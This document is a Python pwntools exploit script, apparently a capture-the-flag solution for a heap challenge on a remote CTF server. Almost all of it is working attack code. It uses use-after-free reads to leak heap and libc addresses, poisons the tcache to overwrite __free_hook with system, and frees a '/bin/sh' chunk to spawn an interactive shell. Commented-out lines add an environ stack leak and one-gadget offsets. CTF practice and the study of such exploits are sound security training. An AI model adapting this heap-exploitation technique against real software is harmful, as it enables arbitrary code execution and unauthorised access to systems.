from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")

def start():
    if args.REMOTE:
        return remote("chall.ehax.tech", 1925)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def malloc(index, size, payload):
    io.sendlineafter("> ", b"1")
    io.sendlineafter("> ", str(index).encode())
    io.sendlineafter("> ", str(size).encode())
    io.sendlineafter("> ", payload)

def free(index):
    io.sendlineafter("> ", b"2")
    io.sendlineafter("> ", str(index).encode())

def edit(index, content):
    io.sendlineafter("> ", b"3")
    io.sendlineafter("> ", str(index).encode())
    io.sendlineafter("> ", content)

def view(index):
    io.sendlineafter("> ", b"4")
    io.sendlineafter("> ", str(index).encode())
    return io.recvline()

context.terminal = ['gnome-terminal', '-e']
io = start()

malloc(0, 0x420, b"A"*8)

malloc(1, 24, b"A"*8)

malloc(2, 24, b"C"*8)

free(1)
free(2)

free(0)


heap_leak = u64(view(2).strip().ljust(8, b"\x00"))

heap_base = heap_leak - 0x6d0

print(f"Heap Leak: {hex(heap_leak)}")

leak_libc = u64(view(0).strip().ljust(8, b"\x00"))

libc.address = leak_libc - 0x1ecbe0

print(f"Leak Libc: {hex(leak_libc)}")
print(f"System: {hex(libc.sym.system)}")

"""
#mask = heap_base >> 12
edit(2, p64(libc.sym.environ))

malloc(2, 0, b"")
malloc(2, 0, b"")

leak_stack = u64(view(2).strip().ljust(8, b"\x00"))

print(f"Leak Stack: {hex(leak_stack)}")
"""
malloc(1, 0x40 - 8, b"")
malloc(2, 0x40 - 8, b"")


free(1)

free(2)


edit(2, p64(libc.sym.__free_hook - 8))


one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]

malloc(2, 0x40 - 8, b"")


#malloc(2, 0x40 - 8, p64(0x4242424242424242))
#malloc(2, 0x40 - 8, p64(libc.address + one_gadget[0]))

malloc(2, 0x40 - 8, b"/bin/sh\x00" + p64(libc.sym.system))

free(2)

io.interactive()
